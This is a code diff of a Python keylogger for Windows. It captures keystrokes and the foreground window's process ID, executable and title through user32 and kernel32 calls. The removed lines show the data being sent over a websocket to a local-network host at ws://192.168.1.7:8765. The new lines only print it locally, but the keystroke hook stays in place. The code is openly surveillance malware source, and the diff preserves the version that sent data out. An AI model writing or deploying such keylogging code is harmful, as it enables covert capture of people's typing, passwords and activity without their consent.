@@ -13,7 +13,7 @@ current_window = None
 url = "ws://192.168.1.7:8765"
 
 
-async def get_current_process():
+def get_current_process():
     # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
 
@@ -37,10 +37,9 @@ async def get_current_process():
     # print out the header if we're in the right process
     print()
 
-    async with websockets.connect(url) as websocket:
-        keylogger_data = f"ID:{process_id} exe:{executable.value} title:{window_title.value}"
+    keylogger_data = f"ID:{process_id} exe:{executable.value} title:{window_title.value}"
 
-        await websocket.send(keylogger_data)
+
 
     # print("[ PID: %s - %s - %s ]" % (process_id,
     #                                  executable.value,
@@ -49,18 +48,20 @@ async def get_current_process():
     # print()
 
     # close handles
+
+    print(keylogger_data)
+
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
-asyncio.get_event_loop().run_until_complete(get_current_process())
 
-async def KeyStroke(event):
+def KeyStroke(event):
     global current_window
 
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
-        await get_current_process()
+        get_current_process()
 
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
